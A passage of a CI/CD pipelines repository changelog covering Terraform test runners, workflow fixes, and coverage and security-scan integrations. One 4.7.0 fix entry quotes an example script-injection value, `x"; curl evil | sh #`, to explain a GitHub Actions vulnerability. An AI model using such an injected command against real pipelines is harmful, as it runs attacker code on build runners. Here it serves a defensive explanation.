- fixed `makefiles/terraform.mk` `test` recipe so the "no `tests/*.tftest.hcl`" early-exit actually prevents `terraform init` and `terraform test` from running. In GNU Make, each tab-indented recipe line is dispatched to a separate `/bin/sh -c`, so the old `exit 0` inside the guard's `if ... fi` only terminated *that* shell — Make saw a zero exit code and blithely ran the next two lines, defeating the guard on modules without a `tests/` directory. The guard and the init/test chain are now joined into a single `if ... else ... fi` block executed by one shell, so `exit 0` isn't needed and the `else` branch only runs when tests actually exist. Also switched `test-gen` from `bash` to `sh` to match the POSIX-`sh` shebang on `tftest-gen/run.sh`

### Removed

- removed the `Install Static Curl` step from `azure-devops/global/stages/40-delivery/release.yaml` and the `--retry-on-http-error 429,500,502,503,504` flag from the `Create Tag` curl invocation. The static-curl bootstrap was added on the (incorrect) premise that `--retry-on-http-error` was a valid curl flag introduced in 8.9.0 — but that flag does not exist in **any** curl version (verified locally against `stunnel/static-curl` 8.19.0; `curl --help all | grep retry` lists only `--retry`, `--retry-all-errors`, `--retry-connrefused`, `--retry-delay`, `--retry-max-time`). System curl 8.5 on Microsoft-hosted `ubuntu-24.04` was always sufficient. The bootstrap was therefore solving a phantom problem at the cost of ~5s per release run, a network dependency on `github.com/stunnel/static-curl`, and recurring SHA-bump maintenance — all of which are now gone

## [4.7.0] - 2026-04-24

### Added

- added `global/scripts/languages/terraform/structural/run.sh` — a third-tier runner that executes the consumer's `tests/structural.sh` (if present) and propagates its exit code. Structural assertions — customer directory naming, shared `root.hcl` presence, bootstrap self-containerizes — are inherently project-specific, so the script itself stays consumer-owned; the runner is just the glue. No-op when `tests/structural.sh` is absent, matching the opt-in contract already used by `terra-test/run.sh` and `terratest/run.sh`. `STRUCTURAL_SCRIPT` env var overrides the default path
- added `global/scripts/languages/terraform/terra-test/run.sh` — a shared test runner that iterates `modules/*/tests/*.tftest.hcl`, invokes `terraform test -junit-xml=<path>` per module (requires Terraform `1.11+`, already pinned by `terra install`), aggregates every per-module JUnit into a single `<testsuites>` bundle at `build/reports/terra-tests.xml`, and emits a coverage summary at `build/reports/terra-coverage.{md,json}`. Coverage measures *breadth* (`tested_modules / total_modules`) plus aggregate case counts (passed / failed / errored) because Terraform has no native line-coverage concept — a plan/apply exercises every expression or none. Skips modules without a `tests/` directory (or with an empty `tests/` that would trip `terraform test` with "no test files found") so consumers onboard incrementally instead of all-at-once
- added `global/scripts/languages/terraform/terratest/run.sh` — a shared [Terratest](https://terratest.gruntwork.io/) runner that drives the consumer's Go test suite under `tests/terratest/` and publishes the results as JUnit XML at `build/reports/junit-terratest.xml`. Complements the `terra-test` runner by covering what native `terraform test` can't: stacks and environments that reference private git-SSH modules or resolve `dependency.*.outputs.*` (where a real `terraform validate` would need credentials), plus cross-module invariants that are awkward to express in a `.tftest.hcl` file. Auto-installs `go-junit-report` on first run so agents don't need it pre-provisioned. No-op when the consumer has no `tests/terratest/` directory — opt-in by creating the directory
- added `global/scripts/languages/terraform/test-all/run.sh` — a unified orchestrator that runs both tiers (`terra-test` over `modules/*/tests/*.tftest.hcl` then `terratest` over `tests/terratest/*.go`) behind a single entry point, auto-detects which tiers the consumer actually has, merges both JUnit files into `build/reports/junit-terra-all.xml`, and exits `0` cleanly (emitting an empty but valid JUnit) when neither tier has tests; stack-only repos (no `modules/` tests, no `tests/terratest/`) pass the stage without a bespoke opt-out. Each tier's own runner still emits its own per-tier artifacts (`terra-tests.xml`, `junit-terratest.xml`, `terra-coverage.{md,json,xml}`) alongside the merged bundle, and the non-zero exit from either tier is preserved so CI correctly fails
- added `PRE_STEPS` parameter to `azure-devops/terra/stages/30-tests/terra.yaml` (the `test:all` job) and wired the top-level `azure-devops/terra/terra.yaml` to thread the same consumer-provided list through. Previously `PRE_STEPS` only reached the `20-security` stage — the tests job had no hook, so consumers whose modules pin private `source = "git@..."` references hit `ssh: Could not resolve hostname` inside `terraform init` during tier 1 (`terraform test`) while the SAST tools in the security stage resolved the same references cleanly. With this change, a single `PRE_STEPS` list (typically `setup-modules-repo.yaml@terra` in Azure DevOps consumers) covers both the `20-security` and `30-tests` stages, keeping the consumer contract symmetric across the two stages that actually need pre-test SSH setup.
- added `PublishCodeCoverageResults@2` task to `azure-devops/terra/stages/30-tests/terra.yaml` pointing at `terra-coverage.xml`. Azure DevOps renders the **Code Coverage** tab on every build showing `tested / total` modules as a percentage — no bespoke dashboard required. Terraform has no line-coverage concept, so the runner deliberately maps its breadth metric onto the Cobertura schema; there's nothing else meaningful to measure at plan time
- added `test-structural` target to `makefiles/terra.mk` for local parity. Consumers who want `make validate` to also chain structural can define a wrapper in their repo-local Makefile; the upstream `validate` stays focused on the heavier tiers so it doesn't duplicate what CI runs on its own job
- added `test-terra-test` and `test-terratest` escape-hatch targets to `makefiles/terra.mk` for operators who want to exercise one tier at a time (e.g., while debugging a misbehaving Terratest suite without re-running the full `terraform test` matrix). The default `test` target now delegates to the unified `test-all` runner
- added `test:all` job to `gitlab/terra/stages/30-tests/terra.yaml` — runs the unified Terra test runner, publishes the merged JUnit via GitLab's `artifacts:reports:junit`, and emits the Cobertura coverage via `artifacts:reports:coverage_report` so the MR widget renders the module breadth percentage. Skips gracefully when neither tier has tests. Previously the GitLab template delegated to `make test` as a loose shell loop over `modules/*`, without JUnit or coverage plumbing
- added `test:structural` job to `gitlab/terra/stages/30-tests/terra.yaml` — runs the structural runner and publishes the JUnit via `artifacts:reports:junit` so the GitLab MR widget renders per-case results alongside the unified test results
- added `test_structural` job to `azure-devops/terra/stages/30-tests/terra.yaml` — runs the structural runner, publishes `junit-structural.xml` via `PublishTestResults@2`. `dependsOn: []` so it runs in parallel with `test:all`; the shell tier is offline and deps-free, no reason to queue behind the heavier test tiers
- added `tests-test_structural` job to `.github/workflows/terra.yaml` — runs the structural runner and uploads `junit-structural.xml` as the `structural-results` artifact. `if-no-files-found: 'ignore'` so repos without a structural script don't see an artifact-upload warning
- added `TESTS_DIR` honor to `global/scripts/languages/terraform/test-all/run.sh`. The orchestrator now detects and runs the Terratest tier under `${TESTS_DIR:-tests/terratest}`, matching the same env-var contract the tier runner (`terratest/run.sh`) already exposes. Consumers with a non-standard Terratest location (e.g., `test/terratest/` or `e2e/terratest/`) get consistent detection + execution from both the orchestrator and the tier runner
- added a `pipelines_ref` input to the `.github/workflows/terra.yaml` reusable workflow. The `Checkout pipelines repo for shared scripts` step now derives its ref from `github.workflow_ref` (parsed via `${GITHUB_WORKFLOW_REF##*@}`) so scripts stay in sync with the workflow version the consumer pinned — previously the step hard-coded `ref: 'main'`, which would have pulled unexpected script changes into a consumer who pinned the workflow to a release tag/SHA. `pipelines_ref` lets consumers override this default when they deliberately want a different script revision
- added Cobertura emission to `global/scripts/languages/terraform/terra-test/run.sh` — writes `build/reports/terra-coverage.xml` alongside the existing Markdown + JSON summaries. Each module is one `<class>` with one `<line>`: `hits=1` when the module has `tests/*.tftest.hcl`, `hits=0` when it doesn't. `lines-valid = total_modules`, `lines-covered = tested_modules`, so the `line-rate` attribute matches the breadth percentage
- added full Terra test wiring to `.github/workflows/terra.yaml` `tests-test_all` job — checks out the pipelines repo at a known path, exports `SCRIPTS_DIR`, invokes the unified runner, and uploads `build/reports/` as the `terra-coverage` artifact via `actions/upload-artifact@v4`. Previously the GitHub workflow delegated to `make test` as a loose shell loop over `modules/*`, without JUnit or coverage plumbing
- added the standard `SCRIPTS_DIR` auto-detection preamble to `global/scripts/languages/terraform/terra-test/run.sh` and `global/scripts/languages/terraform/terratest/run.sh` to match the convention used by every other `run.sh` script in the repo (per `CLAUDE.md` Script Conventions)

### Changed

- changed `.github/workflows/terra.yaml` `Setup Go` step in the `tests-test_all` job to read the Go version from the consumer's `tests/terratest/go.mod` via `actions/setup-go`'s `go-version-file`, matching the `go-version-file: 'go.mod'` pattern already used by every other `github/golang/stages/**/action.yaml` in this repo. Falls back to a `1.24` baseline when no Terratest `go.mod` exists (stack-only repos, or repos with no Terra tests at all) because `setup-go` errors on a missing file. The `code_check-style_terra_format` job still uses the `1.24` pin because it never reads consumer Go code
- changed `azure-devops/terra/stages/30-tests/terra.yaml` to a single unified `test:all` job that orchestrates both tiers (`terra-test` + `terratest`) behind one entry point via the new `test-all/run.sh` runner, publishes the merged JUnit at `build/reports/junit-terra-all.xml` via `PublishTestResults@2` (`failTaskOnFailedTests: true`), and keeps the Cobertura coverage + pipeline artifact publish from before. Removed the separate `test_terratest` job so stack-only repos no longer see a spurious duplicate job in the pipeline graph. Bumped the `GoTool@0` pin from `1.23` to `1.24` so `GOTOOLCHAIN=auto` (Go `1.21+` default) can transparently fetch newer toolchains required by consumer `go.mod` files under `tests/terratest/` (Terratest suites frequently pin `go 1.26`+, which Go `1.23` could not satisfy and which was causing test failures on every consumer build)
- changed `gitlab/terra/abstracts/terra.yaml` base image from `golang:1.23` to `golang:1.24` for the same reason — `GOTOOLCHAIN=auto` handles anything higher required by the consumer's `go.mod`
- changed `makefiles/terra.mk` `test` target to delegate to the unified `test-all/run.sh` runner instead of a single-tier bash call. `make test` now runs both tiers (when present) and produces the merged JUnit + coverage artifacts in one pass. The `validate` composite target simplifies to `format lint test` because `test` already covers every tier
- changed the golang pipeline version from `1.24` to `1.26`

### Fixed

- fixed `.github/workflows/terra.yaml` script-injection risk flagged by SonarCloud rule `GitHub Actions should not be vulnerable to script injections`. Both `Resolve pipelines ref` steps (in `tests-test_all` and `tests-test_structural`) previously interpolated `${{ inputs.pipelines_ref }}` directly into the `run:` script, so a consumer who passed a value like `x"; curl evil | sh #` would inject arbitrary shell into the runner. Now passes the input through the step's `env:` mapping as `PIPELINES_REF`, which the shell *expands* at runtime instead of GitHub Actions *substituting* at YAML-parse time — breaking the injection path
- fixed `azure-devops/global/stages/40-delivery/release.yaml` silently swallowing failures from the Azure DevOps `annotatedtags` REST call. `curl` exits `0` on HTTP `4xx`/`5xx` unless `--fail` is passed, and `set -e` reacts only to non-zero exits — so a throttled, unauthorized, or 5xx response from `POST .../annotatedtags?api-version=7.1-preview.1` left the bump commit untagged while the release job reported green. Observed impact: on `2026-03-03` a coordinated `AutoBump` cycle merged 24 `chore(bump)` PRs across `terraform-modules/*` within a minute; 5 of the 24 module tags (`azm-k8s-cluster/1.3.3`, `azm-storage-account/1.1.1`, `azm-watcher-flow-log/1.0.1`, `k8s-deployment/1.0.1`, `kck-idp-oidc/1.2.2`) were never created, most likely because of Azure DevOps REST throttling when many pipelines POST to the same endpoint concurrently. Added `--fail --show-error --retry 5 --retry-delay 5` so transient failures (429/5xx) are retried and non-transient failures (400/401/403/404/409) fail the release step visibly without extra retry delay
- fixed `azure-devops/terra/stages/30-tests/terra.yaml` `PublishPipelineArtifact@1` input key from `artifact` to `artifactName` for consistency with every other Azure DevOps template in the repo (e.g., `azure-devops/global/stages/20-security/codeql.yaml`). Prevents the task from silently ignoring the artifact name
- fixed `azure-devops/terra/stages/30-tests/terra.yaml` failing with exit `127` ("command not found") on every consumer build since `dbc13ec` (`feat(terra): added Terratest runner for stacks + environments`, PR `#363`). The `test:all` job invokes `$(Scripts.Directory)/global/scripts/languages/terraform/test-all/run.sh`, but `Scripts.Directory` is populated by the `azure-devops/global/abstracts/scripts-repo.yaml` step (referenced relatively from the job as `../../../global/abstracts/scripts-repo.yaml`) — which the job never included. With the variable unset, the shell expanded the command to `/global/scripts/.../run.sh`, bash said "No such file or directory", and the job returned `127`. Now mirrors the pattern already used by the sibling `azure-devops/terra/stages/35-management/terra.yaml` job: the `azure-devops/global/abstracts/scripts-repo.yaml` step runs first so it clones `rios0rios0/pipelines` into a temp dir and publishes the path as `$(Scripts.Directory)` before the runner is invoked. Observed impact: shared-toolbox.dev build `34509` logged a companion `.docs/pipeline-broken-steps-runbook.md` flagging this exact failure mode for the upstream fix
- fixed `gitlab/terra/stages/30-tests/terra.yaml` `test:structural` job extending `.terra` (which installs the terra CLI and pulls the `golang:1.24` image). The shell runner is deps-free — no terra CLI, no Terraform, no Go — so the job now extends `.scripts-repo` directly on an `alpine/git:latest` image, matching the "offline, deps-free" intent documented in the surrounding comments
- fixed `global/scripts/languages/terraform/structural/run.sh` invoking the script as `./${SCRIPT}` which broke absolute-path overrides (`STRUCTURAL_SCRIPT=/tmp/custom.sh` → `./tmp/custom.sh` → "No such file") and double-prefixed values that already started with `./`. Now executes `"${SCRIPT}"` directly so both relative and absolute paths work. Also emits an empty-but-valid `${REPORT_PATH}/junit-structural.xml` when skipping so downstream publishers (`PublishTestResults@2` in Azure DevOps, `artifacts:reports:junit` in GitLab CI) don't warn about a missing report file — mirroring the same pattern already used by `test-all/run.sh`
- fixed `global/scripts/languages/terraform/terra-test/run.sh` to skip the phantom iteration when `modules/` exists without subdirectories. POSIX `sh` has no `nullglob`, so `for mod in modules/*/` previously ran once with the literal glob and recorded a fake module named `*`, producing incorrect coverage and module lists
- fixed `global/scripts/languages/terraform/test-all/run.sh` and `global/scripts/languages/terraform/terra-test/run.sh` aborting under `set -u` when `HOME` is unset — a real case on minimal CI/container images that launch without a `HOME` environment variable. Both scripts referenced `${HOME}/.terraform.d/plugin-cache` in the default expansion of `TF_PLUGIN_CACHE_DIR`, so `set -u` treated the unset `HOME` as an error and the runner exited before any tests ran. Now both scripts guard `HOME` (via `${HOME:-}`) and fall back to `${TMPDIR:-/tmp}/terraform-plugin-cache` when `HOME` is empty so the cache still lands on a writable path
- fixed `global/scripts/languages/terraform/test-all/run.sh` and `global/scripts/languages/terraform/terra-test/run.sh` exhausting runner disk on repos with many modules. The test runner loop calls `terraform init -upgrade` per module, and without a shared plugin cache each module downloads its own copy of every provider into `modules/<name>/.terraform/providers/...`. With provider binaries in the 100-300 MB range (`hashicorp/azurerm`, `hashicorp/kubernetes`, `hashicorp/helm`, `hashicorp/aws`) and dozens of modules, peak disk use climbed past the ~14 GB free space on a standard Azure-hosted / GitHub-hosted runner and every `terraform init` after the ~27th module failed with `no space left on device`. The orchestrator now exports `TF_PLUGIN_CACHE_DIR` (default `${HOME}/.terraform.d/plugin-cache`) and `TF_PLUGIN_CACHE_MAY_BREAK_DEPENDENCY_LOCK_FILE=true` before invoking either tier, and the tier runner does the same so the `test-terra-test` escape hatch gets the cache when operators bypass `test-all`. Peak disk drops from tens of GB to ~`1 GB` regardless of module count. Both env vars are overridable by the consumer. Observed impact: `customer-clusters.dev` build `34738` failed with `no space left on device` starting at module 28 of 89; a second symptom was the Go `go-junit-report` build failing with `mkdir /tmp/go-build...: no space left on device` once `/tmp` filled up, which in turn corrupted the ADO runner's own diag log write (`##[error]No space left on device : '/home/vsts/actions-runner/.../1de0772e-715c-4821-a8ae-64615f057edc_1.log'`) and flipped the task to failed even though `terra-test` itself reported `passed=37 failed=0 errored=0` on the subset that ran

## [4.6.2] - 2026-04-21

### Changed

- changed the terraform pipeline version from `1.14.8` to `1.14.9`

### Fixed

- fixed `global/scripts/tools/gitleaks/run.sh` silently overwriting and deleting any project-local `.gitleaks.toml` during the second (GitLab-rule) pass, so consumers had no way to keep their own rules + allowlist across both passes. The wrapper now mounts the bundled GitLab config read-only into the container and selects it via `--config` for the second pass, leaving the project's working tree untouched. Both passes still auto-discover the project's `.gitleaksignore` (fingerprint allowlist) at the source root, so suppressed findings stay suppressed in both passes.

## [4.6.1] - 2026-04-19

### Fixed

- fixed `.github/workflows/update-major-version-tag.yaml` leaving the rolling major-version GitHub Release (e.g., `v4`) with a stale `publishedAt`, a concatenated `body`, and — once exercised end-to-end — stealing the "Latest" badge from the SemVer release. `softprops/action-gh-release@v2` cannot refresh `publishedAt` on an existing release and was appending another `generate_release_notes` block on every bump (four concatenated "What's Changed" sections by `4.6.0`). Recreating the release via `gh release create --latest=false` was not enough either: GitHub resolves the repo's Latest release dynamically by newest `created_at`, so the fresh major-version release displaced the SemVer one in the UI and at `/releases/latest`. The workflow now (a) deletes the existing major-version release with `gh release delete --yes` without `--cleanup-tag` so the force-pushed tag is preserved, (b) recreates it via `gh release create --latest=false --generate-notes`, and (c) PATCHes the SemVer release with `make_latest=true` to re-assert it as Latest. Also added `fetch-depth: 0` to `actions/checkout@v4` and anchored the major tag to the SemVer tag's commit (`git tag -fa $MAJOR $SEMVER`) so the tag is always at the exact SemVer commit regardless of which ref triggered the workflow, and added a `workflow_dispatch` trigger so maintainers can manually re-run the flow for a specific SemVer tag
- fixed `azure-devops/global/stages/35-management/sonarqube.yaml` downloading the coverage artifact to the repo root, causing Python's `cobertura.xml` (published from `build/reports/`) to land flat at `$(Build.SourcesDirectory)/cobertura.xml` instead of `build/reports/cobertura.xml` where `sonar.python.coverage.reportPaths` expects it, resulting in 0% coverage on every Python pipeline run. Added a `COVERAGE_ARTIFACT_TARGET_PATH` parameter (default: `$(Build.SourcesDirectory)`) and overrode it to `$(Build.SourcesDirectory)/build/reports` in `azure-devops/python/stages/35-management/pdm.yaml`. Also added `build/reports/cobertura.xml` to the coverage-detection loop in `global/scripts/tools/sonarqube/run.sh` and to the inline GitLab CI loop in `gitlab/global/stages/35-management/abstracts.yaml` so neither pipeline clears `sonar.python.coverage.reportPaths` when the report exists at the standard Python path.
- fixed the `report:dependency-track` job failing with `HTTP 401` on every Azure DevOps consumer whose `DEPENDENCY_TRACK_TOKEN` pipeline variable is marked `isSecret: true`. Azure Pipelines deliberately gates secret variables from the script step's process environment — the `$(DEPENDENCY_TRACK_TOKEN)` macro is substituted at task-parse time but the shell's `$DEPENDENCY_TRACK_TOKEN` is **empty** unless explicitly mapped via the step's `env:` block. Without the mapping, `global/scripts/tools/dependency-track/run.sh` sends `X-Api-Key:` with no value and DT rejects the upload. Added the explicit `env:` mapping (`DEPENDENCY_TRACK_TOKEN` + `DEPENDENCY_TRACK_HOST_URL`) on every Azure DevOps invocation of the script: `azure-devops/terra/stages/35-management/terra.yaml`, `azure-devops/terraform/stages/35-management/terra.yaml`, `azure-devops/golang/stages/35-management/go.yaml`, `azure-devops/python/stages/35-management/pdm.yaml`, `azure-devops/dotnet/stages/35-management/core.yaml`, and `azure-devops/javascript/stages/35-management/steps/dependency-track.yaml`. GitLab CI is unaffected (masked variables are still process-env-exposed); GitHub Actions has no DT integration in this repo.

## [4.6.0] - 2026-04-17

### Added

- added `DOWNLOAD_COVERAGE_ARTIFACT` (boolean, default `true`) and `COVERAGE_ARTIFACT_NAME` (string, default `coverage`) parameters to `azure-devops/global/stages/35-management/sonarqube.yaml`, so consumers without a coverage-producing test stage (Terraform, infrastructure-only projects) can skip the `Download Coverage File` task entirely instead of reporting `##[error]Artifact coverage was not found`. Both the `azure-devops/terra/stages/35-management/terra.yaml` and `azure-devops/terraform/stages/35-management/terra.yaml` wrappers now pass `DOWNLOAD_COVERAGE_ARTIFACT: false` by default.
- added `global/scripts/languages/terraform/cyclonedx/run.sh`, a CycloneDX BOM generator for Terraform projects that delegates to `trivy filesystem --format cyclonedx`, captures provider pins from `.terraform.lock.hcl` and module `source =` references (including private `git@...` remotes when upstream SSH setup is wired), and post-processes `metadata.component.{name,version}` via `jq` from `DT_PROJECT_NAME` / `DT_PROJECT_VERSION` env vars (falling back to the git remote basename and the latest Git tag matches the placement and shape of the existing Go (`global/scripts/languages/golang/cyclonedx/run.sh`) and Python (`global/scripts/languages/python/cyclonedx/run.sh`) scripts
- added a `generate CycloneDX BOM` step before the `upload BOM to Dependency-Track` step in `azure-devops/terra/stages/35-management/terra.yaml` so Terra consumers get the BOM automatically, resolving the long-standing `TODO: Missing CycloneDX for Terraform` marker. Also removed that TODO echo step now that it is addressed.
- added a `pre_script` input to the GitHub Actions `docker-semgrep` and `trivy` composite actions and to the `terra.yaml` reusable workflow, mirroring the Azure DevOps `PRE_STEPS` hook so consumers can configure SSH before the Terraform SAST scanners run
- added a `PRE_STEPS` `stepList` parameter to `azure-devops/terra/terra.yaml`, forwarded through `stages/20-security/terra.yaml` into the `sast:trivy` (`azure-devops/global/stages/20-security/trivy.yaml`) and `sast:semgrep` (`azure-devops/global/stages/20-security/docker.yaml`) jobs, so consumers with private Terraform modules can inject SSH setup before the scanners parse `source = "git@..."` references — previously Trivy and Semgrep failed to clone remote modules and `sast:*` jobs reported `succeededWithIssues` on every build
- added a `SAST_PRE_SCRIPT` variable hook to the GitLab CI `sast:semgrep` and `sast:trivy` jobs, mirroring the Azure DevOps `PRE_STEPS` hook so consumers can configure SSH before the Terraform SAST scanners run
- added SSH config and `SSH_AUTH_SOCK` forwarding to `global/scripts/tools/semgrep/run.sh` so that `PRE_STEPS`-based SSH setup propagates into the Semgrep Docker container, enabling private Terraform module cloning during scans

### Fixed

- fixed `gitlab/global/stages/20-security/trivy.yaml` collecting only `trivy.sarif` as an artifact, which would produce missing-artifact warnings for GitLab consumers now that `trivy.json` is the primary output; the job now collects both `trivy.json` (always produced) and `trivy.sarif` (best-effort).
- fixed `global/scripts/tools/dependency-track/run.sh` failing the `report:dependency-track` job on consumers without a CycloneDX BOM generator. The script now exits `0` cleanly with a `No CycloneDX BOM at … — skipping Dependency-Track upload.` message when `build/reports/bom.json` does not exist, instead of `cat` erroring and the downstream `curl` returning HTTP `401` on an empty upload. Applies to Terraform/Terra consumers (`azure-devops/terra/stages/35-management/terra.yaml` carries a `TODO: Missing CycloneDX for Terraform` marker) and any other consumer whose language track has no BOM generator wired.
- fixed `global/scripts/tools/trivy/run.sh` crashing with a nil-URL `SIGSEGV` in `pkg/report/sarif.go:103` when Terraform `source =` pins reference an SSH remote like `git@host:path/repo?ref=x` (Go's `net/url` rejects the colon in the first path segment). The script continues to produce `trivy.json` as the primary report via `--format json` (aligned with `trivy-sca.json`, `govulncheck.json`, and the other tool outputs), and still runs `trivy convert --format sarif` to preserve `trivy.sarif` for consumers that publish to GitHub Code Scanning. To stop `trivy convert` from hitting the same shared `SarifWriter` panic path, it now pre-processes a *copy* of `trivy.json` with `jq`'s `walk` (redefined inline for `jq` versions older than `1.6`), rewriting every `git@host:path` string to the equivalent valid RFC 3986 URL `ssh://git@host/path` before conversion runs, while leaving `trivy.json` untouched as the authoritative artifact. `trivy.sarif` is therefore produced without flooding the build logs with the stack trace, while the fallback `|| echo "SARIF conversion failed; trivy.json is authoritative."` remains as a safety net for unrelated convert failures.

## [4.5.0] - 2026-04-15

### Added

- added `azure-devops/terraform/stages/40-delivery/terra.yaml` wiring the shared `release.yaml` tag-creation job into the Azure DevOps Terraform pipeline, so that merges of `chore/bump-X.Y.Z` branches automatically create an annotated Git tag — previously the `40-delivery` stage was commented out in `azure-devops/terraform/terra.yaml` and the directory was empty, leaving Terraform module bumps without any automatic tagging

### Changed

- changed `azure-devops/terraform/terra.yaml` to include the new `stages/40-delivery/terra.yaml` stage (previously commented out)
- changed the GitLab CI and the global `golang.1.26-awscli` container Go version from `1.26.1` to `1.26.2` to align with the Azure DevOps bump in 4.4.1

### Fixed

- fixed `update-major-version-tag.yaml` silently skipping on every bump release — the previous `github.event_name == 'workflow_call'` guard never matched because reusable workflows inherit the caller's `event_name` (e.g. `push`), so the `v4` tag had been stuck at `4.1.0` since PR #327; now detects `workflow_call` via the `inputs.tag_name` presence check

## [4.4.1] - 2026-04-14

### Changed

- changed the Azure DevOps GoLang version from `1.26.1` to `1.26.2`

## [4.4.0] - 2026-04-03

### Added

- added ShellCheck platform integration stage files for GitHub Actions, GitLab CI, and Azure DevOps under `20-security`
- added ShellCheck tool at `global/scripts/tools/shellcheck/run.sh` with auto-installation when the binary is not available locally, following the same pattern as Hadolint

## [4.3.0] - 2026-04-01

### Added

- added default PMD ruleset with unused code rules at `global/scripts/languages/java/pmd/pmd-ruleset.xml` for downstream Gradle/Maven projects
- added whole-project unused code detection (stage 10, code-check) for Python (`vulture`), JavaScript/TypeScript (`knip`), Java (ProGuard `-printusage`), Ruby (`debride`), and PHP (`phpmd`) — integrated into `make lint` and CI pipelines across GitHub Actions, GitLab CI, and Azure DevOps

### Changed

- changed Azure DevOps `sonar.projectName` derivation to use `project/repository` format instead of just the repository name
- changed Go unused code detection to rely on existing `golangci-lint` linters (`unused`, `unparam`, `wastedassign`) instead of a standalone `deadcode` tool

### Fixed

- fixed `golangci-lint` script to use a local binary when available (v2+) before attempting to download, improving portability for environments like Android/Termux
- fixed `vulture` scanning `.venv` directory contents by adding `--exclude .venv` to all invocation points (run.sh, Azure DevOps, GitLab CI)
- fixed major version tag (e.g. `v4`) not updating on automated releases — `GITHUB_TOKEN` events don't cascade to other workflows, so `release.yaml` now calls `update-major-version-tag.yaml` as a reusable workflow via `workflow_call`

## [4.2.0] - 2026-03-26

### Added

- added `release.yaml` workflow to automatically create GitHub Releases and tags when bump PRs are merged, enabling the `update-major-version-tag.yaml` chain
- added automatic derivation of `sonar.projectKey` and `sonar.projectName` from CI platform variables (GitHub, Azure DevOps, GitLab), enabling zero-config SonarQube enrollment for new projects
- added test suite for SonarQube auto-derivation logic covering `normalize_sonar_key`, per-platform derivation, environment variable overrides, and existing property preservation

### Changed

- changed the Terraform pipeline version from `1.14.7` to `1.14.8`

### Fixed

- fixed inconsistent SonarQube project key sanitization in GitLab templates — now uses full character sanitization matching `run.sh` and Azure DevOps templates

## [4.1.0] - 2026-03-24

### Added

- added `major.minor` Docker tag (e.g., `:1.2`) alongside the full SemVer tag on tag pushes

### Fixed

- fixed Docker delivery composite action failing with `Password required` by adding `actions/checkout@v6`, defaulting `github_token` to `github.token`, and computing image tags via `docker/metadata-action@v5` when not provided
- fixed Docker delivery not publishing SemVer tags (`:X.Y.Z`, `:X.Y`) on bump commits by chaining `delivery-docker` after `delivery-release` and computing Docker tags from the release version
- fixed Docker delivery skipping on `workflow_dispatch` events by adding the event to the `delivery-docker` condition
- fixed Docker delivery tagging with the branch name instead of `latest` on default branch builds

## [4.0.0] - 2026-03-23

### Added

- added Claude Code Review workflow (`claude-code-review.yaml`) for automated PR code review on open/sync/reopen events
- added Claude Code workflow (`claude.yaml`) for AI-assisted issue and PR comment handling via `@claude` mentions
- added coverage reporting and test results to `go.yaml` via `dorny/test-reporter@v1` and `actions/upload-artifact@v4`
- added coverage reporting and test results to `gradle.yaml` via `dorny/test-reporter@v1` and `actions/upload-artifact@v4` with JaCoCo detection
- added coverage reporting and test results to `maven.yaml` via `dorny/test-reporter@v1` and `actions/upload-artifact@v4` with JaCoCo detection
- added coverage reporting to `npm.yaml` via `davelosert/vitest-coverage-report-action@v2`, `dorny/test-reporter@v1`, and `actions/upload-artifact@v4`, matching `yarn.yaml` features
- added JaCoCo XML report auto-detection for Gradle and Maven in `sonarqube/run.sh`
- added optional SonarQube management stage to `go.yaml` with `sonar_host` input and `sonar_token` secret, matching `yarn.yaml` features
- added optional SonarQube management stage to `gradle.yaml` with `sonar_host` input and `sonar_token` secret, matching `yarn.yaml` features
- added optional SonarQube management stage to `maven.yaml` with `sonar_host` input and `sonar_token` secret, matching `yarn.yaml` features
- added optional SonarQube management stage to `npm.yaml` with `sonar_host` input and `sonar_token` secret, matching `yarn.yaml` features
- added Python composite actions (`pdm-lint`, `safety`, `tests/all`) under `github/python/stages/`, replacing inline workflow steps and matching Go's composite action pattern
- added workflow to auto-update major version tags (e.g., `v3`) when a new SemVer release is published, enabling downstream repos to pin to stable `@v3` refs

### Changed

- **BREAKING CHANGE:** changed `dotnet.yaml` to stages 1-3 only, moving `delivery-release` to `dotnet-docker.yaml` following Go/PDM pattern
- **BREAKING CHANGE:** changed `java-maven.yaml` to `maven.yaml` and `java-maven-docker.yaml` to `maven-docker.yaml`, matching the toolchain naming convention
- **BREAKING CHANGE:** changed `java.yaml` to `gradle.yaml` and `java-docker.yaml` to `gradle-docker.yaml`, matching the toolchain naming convention
- **BREAKING CHANGE:** changed `javascript-npm.yaml` to `npm.yaml` and `javascript-npm-docker.yaml` to `npm-docker.yaml`, matching the toolchain naming convention
- **BREAKING CHANGE:** changed `javascript.yaml` to `yarn.yaml` and `javascript-docker.yaml` to `yarn-docker.yaml`, matching the toolchain naming convention
- **BREAKING CHANGE:** changed `php.yaml` to `composer.yaml` and `php-docker.yaml` to `composer-docker.yaml`, matching the toolchain naming convention
- **BREAKING CHANGE:** changed `ruby.yaml` to `bundler.yaml` and `ruby-docker.yaml` to `bundler-docker.yaml`, matching the toolchain naming convention
- changed `bundler.yaml` to stages 1-3 only, moving `delivery-release` to variant workflows following Go/PDM pattern
- changed `composer.yaml` to stages 1-3 only, moving `delivery-release` to variant workflows following Go/PDM pattern
- changed `go-docker.yaml`, `go-binary.yaml`, and `go-library.yaml` to declare and forward `sonar_host` input and `sonar_token` secret to the inner `go.yaml` workflow
- changed `gradle-docker.yaml` to declare and forward `sonar_host` input and `sonar_token` secret to the inner `gradle.yaml` workflow
- changed `gradle.yaml` to stages 1-3 only (code check, security, tests), moving `delivery-release` to variant workflows following Go/PDM pattern
- changed `maven-docker.yaml` to declare and forward `sonar_host` input and `sonar_token` secret to the inner `maven.yaml` workflow
- changed `maven.yaml` to stages 1-3 only, moving `delivery-release` to variant workflows following Go/PDM pattern
- changed `npm-docker.yaml` to declare and forward `sonar_host` input and `sonar_token` secret to the inner `npm.yaml` workflow
- changed `npm.yaml` to stages 1-3 only, moving `delivery-release` to variant workflows following Go/PDM pattern
- changed `pdm-docker.yaml` to call `pdm.yaml` via `uses:` and add delivery jobs, matching the standard `-docker.yaml` composition pattern used by Go and all other languages
- changed `pdm.yaml` `tests-test_all` dependency chain to include all security jobs (SAST + SCA), matching Go's behavior
- changed `pdm.yaml` to stages 1-3 only (code check, security, tests), moving `delivery-release` to variant workflows following Go's pattern
- changed `pdm.yaml` to use composite actions instead of inline container-based steps, migrating from `python:3.10-pdm-bullseye` container to `actions/setup-python@v6` with Python `3.13`
- changed `python.yaml` to `pdm.yaml` and `python-docker.yaml` to `pdm-docker.yaml`, matching the Azure DevOps and GitLab naming convention (package manager prefix, not language)
